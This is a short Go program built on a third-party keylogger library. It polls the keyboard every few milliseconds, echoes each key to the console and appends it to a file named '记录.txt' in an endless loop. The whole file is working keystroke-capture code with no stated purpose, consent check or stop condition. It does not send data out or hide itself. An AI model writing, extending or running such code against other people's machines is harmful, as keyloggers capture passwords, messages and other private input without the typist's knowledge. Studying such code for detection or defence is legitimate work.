package main

import (
	"fmt"
	"os"
	"time"

	"github.com/kindlyfire/go-keylogger"
)

const (
	delayKeyfetchMS = 5
)

func main() {
	kl := keylogger.NewKeylogger()
	emptyCount := 0
	fileName := "记录.txt"
	dstFile, err := os.Create(fileName)
	if err != nil {
		fmt.Println(err)
	}

	for {
		key := kl.GetKey()

		if !key.Empty {
			fmt.Printf("'%c' %d                     \n", key.Rune, key.Keycode)
			dstFile.WriteString(string(key.Rune) + "\n")
		}

		emptyCount++

		fmt.Printf("Empty count: %d\r", emptyCount)

		time.Sleep(delayKeyfetchMS * time.Millisecond)
	}
}
